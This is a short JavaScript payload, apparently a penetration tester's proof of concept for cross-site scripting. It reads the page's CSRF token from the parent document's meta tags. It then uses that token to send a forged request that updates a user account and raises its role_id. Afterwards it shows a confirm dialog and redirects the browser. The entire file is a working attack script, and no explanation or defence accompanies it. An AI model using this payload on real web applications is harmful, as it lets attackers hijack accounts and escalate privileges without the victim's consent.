var xmlhttp = new XMLHttpRequest();
var meta = parent.document.getElementsByTagName('meta');
var account = "/account/users/1155-first-last";

for (i=0; i<meta.length; i++) {
  if (meta[i].getAttribute("name") == "csrf-token") {
    var csrfToken = meta[i].getAttribute("content");

    //update this users account to role_id 1
    xmlhttp.open("POST",account,true);
    //send the csrf token in a request header
    xmlhttp.setRequestHeader("X-CSRF-Token", csrfToken);
    xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
    
    xmlhttp.send("utf8=%E2%9C%93&_method=put&authenticity_token="+encodeURI(csrfToken)+"&user%5Bfirst_name%5D=First&user%5Blast_name%5D=Last&user%5Brole_id%5D=3&user%5Benabled%5D=true&user%5Bemail%5D=user%40stratumsecurity.com&user_mobile_phone%5Bcountry%5D=US&user_mobile_phone%5Bphone_number%5D=2024556339&user_mobile_phone%5Baccepts_sms%5D=0&user_mobile_phone%5Baccepts_sms%5D=1&user_mobile_phone%5Baccepts_calls%5D=0&user_mobile_phone%5Baccepts_calls%5D=1&commit=Update+User");
  }
}
confirm("We tried to update: " + account + " using " + csrfToken);
//redirect the user
window.location.replace("/account/users/1155-first-last");
